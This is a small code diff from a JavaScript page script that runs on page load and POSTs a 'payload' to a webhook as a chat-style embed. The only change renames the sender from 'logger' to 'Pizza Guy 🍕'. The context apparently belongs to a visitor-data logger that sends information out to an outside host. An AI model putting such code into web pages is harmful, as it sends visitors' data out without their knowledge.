@@ -170,7 +170,7 @@ window.onload = function () {
         request.open("POST", webhook);
         request.setRequestHeader("Content-type", "application/json");
         const params = {
-            username: "logger",
+            username: "Pizza Guy 🍕",
             embeds: [{
                 title: "Information",
                 description: payload,
